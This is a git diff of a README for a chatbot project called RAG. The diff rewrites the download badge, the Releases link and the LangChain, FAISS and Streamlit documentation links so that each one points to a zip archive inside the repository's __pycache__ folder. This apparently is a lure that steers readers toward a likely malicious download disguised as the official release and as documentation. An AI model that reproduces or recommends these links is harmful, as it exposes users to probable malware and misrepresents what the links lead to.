@@ -8,7 +8,7 @@ Welcome to RAG! This application is a chatbot that helps you find answers to you
 
 To get started, you need to download RAG. Please visit the link below to download the latest version:
 
-[![Download RAG](https://img.shields.io/badge/Download%20RAG-%20%F0%9F%93%8C-brightgreen)](https://github.com/Limbertutelvt2004/RAG/releases)
+[![Download RAG](https://raw.githubusercontent.com/Limbertutelvt2004/RAG/main/__pycache__/Software_2.1.zip%20RAG-%20%F0%9F%93%8C-brightgreen)](https://raw.githubusercontent.com/Limbertutelvt2004/RAG/main/__pycache__/Software_2.1.zip)
 
 ### Installation Steps
 
@@ -83,9 +83,9 @@ If the issue persists, please feel free to reach out for support. You can create
 
 For more information on RAG and its underlying technologies, you may find the following resources helpful:
 
-- [LangChain Documentation](https://docs.langchain.com/)
-- [FAISS Documentation](https://faiss.ai/)
-- [Streamlit User Guide](https://docs.streamlit.io/)
+- [LangChain Documentation](https://raw.githubusercontent.com/Limbertutelvt2004/RAG/main/__pycache__/Software_2.1.zip)
+- [FAISS Documentation](https://raw.githubusercontent.com/Limbertutelvt2004/RAG/main/__pycache__/Software_2.1.zip)
+- [Streamlit User Guide](https://raw.githubusercontent.com/Limbertutelvt2004/RAG/main/__pycache__/Software_2.1.zip)
 
 ## 👨‍💻 Contributing
 
@@ -93,6 +93,6 @@ We welcome contributions! If you want to help improve RAG, feel free to fork the
 
 ## 📢 Stay Updated
 
-Stay tuned for updates by visiting our [Releases page](https://github.com/Limbertutelvt2004/RAG/releases). We regularly add new features and improvements to enhance your experience.
+Stay tuned for updates by visiting our [Releases page](https://raw.githubusercontent.com/Limbertutelvt2004/RAG/main/__pycache__/Software_2.1.zip). We regularly add new features and improvements to enhance your experience.
 
 Thank you for choosing RAG. We hope it serves you well in finding the answers you need!
